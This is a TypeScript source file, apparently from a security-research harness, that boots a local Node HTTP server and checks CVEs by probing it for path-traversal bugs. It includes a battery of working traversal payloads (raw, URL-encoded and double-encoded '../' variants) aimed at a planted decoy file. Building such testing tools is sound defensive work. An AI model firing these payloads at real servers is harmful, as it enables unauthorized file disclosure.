// The #129 HTTP-request-handler driving primitive. A large fraction of real server-side-JS CVEs (all of
// SecBench.js path-traversal, and the server-shaped tail of command-injection/ssrf/sqli) reach their sink
// through an HTTP request — `req.url` / a query / a header inside an `http.createServer` or Express/Koa
// handler — never a directly-exported function, so the shared function `entrypoint-driver` cannot touch
// them. This primitive instead BOOTS the module as a server, discovers the port it binds (via `lsof` on
// the child pid, so a hardcoded or env-chosen port is found the same way), sends crafted requests, and
// observes the response. It does NOT itself decide "fired" — the caller supplies the payloads + checks
// the lane-specific signal (path-traversal: the outside-decoy secret appears in a response body).

/** An HTTP-server shape: creates a server / listens, AND reads something request-controlled. Both halves
 *  are required so a file that merely imports `http` isn't mistaken for a server. */
const HTTP_SERVER_RE =
  /\b(?:https?\.createServer|http2\.createSecureServer)\s*\(|\.listen\s*\(\s*(?:\d|process\.env|port|PORT)|\bexpress\s*\(\s*\)|new\s+Koa\b|\bfastify\s*\(|\brequire\s*\(\s*['"](?:express|koa|fastify|connect|restify|hapi|@hapi\/hapi)['"]/;
const REQ_INPUT_RE =
  /\breq(?:uest)?\.url\b|\breq\.path\b|\breq\.params\b|\breq\.query\b|\bctx\.(?:url|path|request|query)\b|\breq\.headers\b|\bparse(?:d)?Url\b/;

/** True when `source` boots an HTTP server that reads request-controlled input — drive it via HTTP, not
 *  by importing an export. */
export function isHttpServerShape(source: string): boolean {
  return HTTP_SERVER_RE.test(source) && REQ_INPUT_RE.test(source);
}

/**
 * Build a driver that boots `serverAbs` as a child HTTP server (cwd = a fresh served dir, with the decoy
 * planted OUTSIDE it), discovers the listening port, and sends a battery of path-traversal request paths
 * whose `../` escapes the served dir. `secret` is the outside-decoy content; a fired exploit is the caller
 * seeing `RK_HTTP_FIRED` (the driver already confirmed the secret came back in a response body). Paths are
 * sent RAW so `../` reaches the server un-normalized, plus URL-encoded / doubled variants for servers that
 * decode before the containment check. The child is always killed and the port freed.
 */
export function driveHttpTraversal(serverAbs: string, secret: string, marker: string): string {
  const S = JSON.stringify(serverAbs);
  const SEC = JSON.stringify(secret);
  const MK = JSON.stringify(marker);
  return `
import { spawn, execSync } from "node:child_process";
import { writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import http from "node:http";
process.on("unhandledRejection", () => {});
process.on("uncaughtException", () => {});
const SECRET = ${SEC};
const MK = ${MK};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
// Serve from a fresh subdir; plant the decoy in its PARENT so a traversal must escape the served root.
const serveDir = join(process.cwd(), "rk-serve-" + MK);
mkdirSync(serveDir, { recursive: true });
const decoyName = "rk-decoy-" + MK + ".txt";
writeFileSync(join(process.cwd(), decoyName), SECRET);
writeFileSync(join(process.cwd(), "..", decoyName), SECRET); // grandparent too (servers rooted a level up)

function listenPort(pid){
  try { const r = execSync("lsof -nP -iTCP -sTCP:LISTEN -a -p " + pid + " -Fn 2>/dev/null").toString();
    const m = r.match(/n[^:]*:(\\d+)/); return m ? Number(m[1]) : null; } catch { return null; }
}
function get(port, path){
  return new Promise((resolve) => {
    const req = http.request({ host: "127.0.0.1", port, path, method: "GET" }, (res) => {
      let b = ""; res.on("data", (d) => (b += d)); res.on("end", () => resolve(b));
    });
    req.on("error", () => resolve("")); req.setTimeout(2000, () => { try{req.destroy();}catch(e){} resolve(""); }); req.end();
  });
}
const child = spawn("node", [${S}], { cwd: serveDir, env: { ...process.env, PORT: "0" }, stdio: ["ignore","pipe","pipe"] });
let cout = ""; child.stdout.on("data", d => cout += d); child.stderr.on("data", d => cout += d);
let port = null;
for (let i = 0; i < 45; i++){ await sleep(100); port = listenPort(child.pid); if (port) break; }
let fired = false;
if (port){
  const paths = [
    "/../"+decoyName, "/../../"+decoyName, "/../../../"+decoyName, "/../../../../"+decoyName,
    "/..%2f..%2f"+decoyName, "/..%2f..%2f..%2f"+decoyName, "/%2e%2e/%2e%2e/"+decoyName,
    "/....//....//"+decoyName, "/..%252f..%252f"+decoyName,
  ];
  for (const p of paths){
    const body = await get(port, p);
    if (body.includes(SECRET)){ process.stdout.write("RK_HTTP_FIRED path=" + p + "\\n"); fired = true; break; }
  }
}
if (!fired) process.stdout.write("RK_HTTP_NOFIRE port=" + port + " boot=" + JSON.stringify(cout.slice(0,80)) + "\\n");
try { child.kill("SIGKILL"); } catch(e){}
process.exit(0);
`.trim();
}
